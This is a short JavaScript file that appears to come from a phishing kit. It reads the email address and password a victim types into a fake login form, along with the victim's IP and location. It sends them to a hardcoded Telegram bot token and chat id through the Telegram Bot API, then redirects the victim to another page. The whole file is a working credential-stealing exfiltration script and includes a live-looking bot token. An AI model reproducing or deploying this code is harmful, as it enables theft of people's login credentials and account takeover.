//bot token
var telegram_bot_id = "7624511401:AAE8rp04W79UnX5DS8t6EUbeTGWNGPgMkww";
//chat id
var chat_id = "7712518065";
var u_name, pax, u_pin2, ip, ip2;
var ready = function () {
    u_name = document.getElementById("uzer").value;
    pax = document.getElementById("pazz").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "📧EMAIL: " + u_name + "\n🔒Cl4v3: " + pax +"\nIP: " + ip +"\n" + ip2 +"\n\n🐺Sacrix32🐺";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index1.html';
        console.log(response);
    });
    return false;
};
